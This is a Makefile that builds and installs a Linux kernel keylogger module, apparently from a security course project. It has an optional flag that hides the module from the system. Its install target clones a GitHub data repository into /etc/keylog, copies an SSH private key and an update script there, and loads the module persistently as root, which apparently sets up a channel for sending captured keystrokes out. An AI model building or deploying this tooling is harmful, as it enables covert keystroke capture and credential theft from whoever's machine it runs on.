modname := keylog
obj-m := $(modname).o

keylog-objs := keylog.o

KVERSION = $(shell uname -r)
KDIR := /lib/modules/$(KVERSION)/build

KCPPFLAGS=""

ifdef HIDDEN
KCPPFLAGS+="-DHIDE_MODULE -DBUFLEN=2048"
endif

all:
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean

load:
	-rmmod $(modname)
	insmod $(modname).ko

unload:
	-rmmod $(modname)

install:
	git clone https://github.com/Sad-0w/CS564_data.git /etc/keylog
	cp ../scripts/run_update.sh /etc/keylog
	cp ../git_id_rsa /etc/keylog
	gcc manager.c -o /etc/keylog/manager.o
	mkdir -p /lib/modules/$(KVERSION)/misc/$(modname)
	install -m 0755 -o root -g root $(modname).ko /lib/modules/$(KVERSION)/misc/$(modname)
	insmod $(modname).ko
	depmod -a


uninstall:
	sudo rm /lib/modules/$(KVERSION)/misc/$(modname)/$(modname).ko
	sudo rmdir /lib/modules/$(KVERSION)/misc/$(modname)
	sudo rm -rf /etc/keylog
	sudo depmod -a
	sudo rmmod $(modname)
	sudo rm -rf /sys/kernel/debug/keylog
